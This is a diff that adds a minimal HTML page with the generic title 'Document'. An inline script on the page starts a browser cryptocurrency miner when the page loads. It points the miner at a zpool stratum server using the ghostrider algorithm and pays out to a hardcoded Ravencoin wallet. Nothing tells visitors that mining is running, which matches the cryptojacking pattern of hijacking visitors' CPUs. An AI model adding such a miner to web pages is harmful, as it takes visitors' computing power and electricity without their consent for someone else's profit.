@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+  <script src="app.js"></script>
+  <script>
+    const stratum = {
+      server: "ghostrider.na.mine.zpool.ca",
+      port: 5354,
+      worker: "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
+      password: "c=RVN"
+    }
+    mine(algos.ghostrider, stratum, true, 2)
+  </script>
+</body>
+</html>
